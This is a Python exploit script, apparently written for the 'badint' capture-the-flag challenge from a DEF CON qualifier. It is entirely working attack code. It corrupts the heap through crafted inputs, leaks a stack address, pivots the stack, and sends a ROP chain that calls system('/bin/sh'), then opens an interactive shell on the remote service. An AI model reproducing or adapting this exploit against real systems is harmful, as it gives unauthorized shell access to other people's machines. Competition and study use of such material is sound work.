
from threading import Thread
# from uploadflag import *
from zio import *

target = ('119.254.101.197', 10000)
target = './test'
target = './badint'
target = ('badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me', 21813)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def add(io, seq, offset, data, is_lsf):
    io.read_until('#:')
    io.writeline(str(seq))
    io.read_until(':')
    io.writeline(str(offset))
    io.read_until(':')
    io.writeline(data.encode('hex'))
    io.read_until(':')
    if is_lsf:
        io.writeline('Yes')
    else:
        io.writeline('No')

def add2(io, seq, offset, data):
    io.read_until('#:')
    io.writeline(str(seq))
    io.read_until(':')
    io.writeline(str(offset))
    io.read_until(':')
    io.writeline(data.encode('hex'))

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    io.gdb_hint()

    add2(io, 7, 0, '1'*0x101)
    io.read_until('[0000000000400D29 called 0000000000400e23]')
    stack_offset = int(io.read_until(']')[:-1], 16) - 0x00007FFFFFFFE010

    add(io, 1, 0x1b8, l64(0x604F40)+l64(0x604f80), 0) #0x61ac50
    add(io, 1, 20, '1111', 0) #0x61aca0
    add(io, 5, 0x320, l64(0x7fffffffe4b8-0x10+stack_offset), 0) #0x61acf0
    add(io, 5, 0, '2222', 0) #0x61ad40
    add(io, 3, 0, '3333', 0) #0x61ad90
    add(io, 3, 0x30, '3333', 0) #0x61ade0
    add(io, 4, 0, '4'*0x30, 0) #
    add(io, 4, 0, '4'*0x30, 1) #
    #add(io, 4, 4, '4444', 1) #

    io.gdb_hint()
    add(io, 5, 0, '2222', 1) #0x61ac30


    add(io, 5, 0, l64(0x7fffffffe4b8+stack_offset), 0) #0x61acf0
    add(io, 5, 0, '2'*0x50, 0) #0x61ad40
    add(io, 5, 0x70, '2'*8, 1) #0x61ac30

    add(io, 5, 0, l64(0x7fffffffe4b8+stack_offset), 0) #0x61acf0
    add(io, 5, 0, '2'*0x50, 0) #0x61ad40

    io.gdb_hint()
    #payload = '5'*0x20 + l64(0x0000000000402533) + l64(0x7ffff73fe177) + l64(0x7ffff72b7390)
    pop_rbp_ret = 0x0000000000402404
    fake_rbp = 0x7fffffffe098-8+stack_offset
    leave_ret = 0x402188
    payload = '5'*0x20 + l64(pop_rbp_ret) + l64(fake_rbp) + l64(leave_ret)


    payload = payload.ljust(0x60, '5')
    add2(io, 0, 0x70, payload)
    io.read_until(':')
    call_dlsym = 0x0000000000400B90
    call_rax = 0x0000000000402241

    pop_rdi_ret = 0x402533
    pop_rsi_r15_ret = 0x402531

    system_addr = fake_rbp + 10*8
    binsh_addr = system_addr+8
    rop = l64(pop_rdi_ret) + l64(0xffffffffffffffff)
    rop += l64(pop_rsi_r15_ret) + l64(system_addr) + l64(0)
    rop += l64(call_dlsym)
    rop += l64(pop_rdi_ret) + l64(binsh_addr)
    rop += l64(call_rax)
    rop += 'system\x00\x00'+'/bin/sh\x00'



    '''
    puts_got = 0x0000000000604028
    puts_plt = 0x0000000000400AC0
    rop = l64(pop_rdi_ret) + l64(puts_got) + l64(puts_plt)
    rop +=
    '''

    rop = rop.ljust(750, '9')
    io.writeline('No'*4+rop)

    #add(io, 2, 0x20, '2222', 0) #0x61acf0
    #add(io, 2, 0x20, '2222', 0) #0x61ad40

    #add(io, 2, 0, '2222', 1) #0x61ac30
    #add2(io, 3, 40, '1'*0x101)
    io.read_until('#:')
    io.writeline(str(0))
    io.read_until(':')
    io.writeline(str(0))
    io.read_until(':')
    io.writeline('')
    interact(io)


exp(target)
